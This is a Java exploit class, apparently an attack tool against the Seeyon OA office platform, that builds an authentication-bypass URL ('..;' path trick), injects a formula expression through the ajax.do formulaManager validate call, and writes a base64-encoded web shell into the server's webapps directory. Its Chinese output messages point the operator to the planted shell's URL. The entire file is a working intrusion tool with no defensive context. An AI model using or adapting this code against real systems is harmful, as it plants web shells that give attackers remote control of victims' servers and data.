import java.io.*;

public class UploadShell {
    public void UploadShell(String oaUrl,String srcFile,String desFile) throws Exception {
        String dFile = desFile;
        HTTPClient httpClient = new HTTPClient();
        String realUrl = oaUrl + "/autoinstall.do.css/..;/ajax.do?method=ajaxAction&managerName=formulaManager&requestCompress=gzip";
        //payload编码
        InputStream is = new FileInputStream(srcFile);
        desFile = "../webapps/seeyon/" + desFile;
        String line;
        String result = "";
        BufferedReader reader = new BufferedReader(new InputStreamReader(is));
        line = reader.readLine();
        if (line == null){
            System.out.println("[!]当前shell文件为空，请检查后重新运行程序！");
        }else {
            while (line != null){
                result = result + line;
                line = reader.readLine();
            }
            byte[] enByte = org.apache.commons.codec.binary.Base64.encodeBase64(result.getBytes());
            String enString = new String(enByte);
            enString ="\"" + enString+"\"";
            String execString = "[{'formulaType':1,'formulaName':'test','formulaExpression':'String shell="+enString+";sun.misc.BASE64Decoder decoder = new sun.misc.BASE64Decoder();java.io.FileWriter writer = new java.io.FileWriter(\""+desFile+"\");writer.write(new String(decoder.decodeBuffer(shell),\"UTF-8\"));writer.flush();writer.close();};test();def static xxx(){'},'',{},'true']";
            String execUrl = new Encoder().Encoder(execString);
            String execExp = "managerMethod=validate&arguments=" + execUrl;
            System.out.println(execExp);
            httpClient.sendPost(realUrl,execExp);
            System.out.println("[!]文件写入完成，请访问" + oaUrl + "/" +dFile);
        }
    }
}
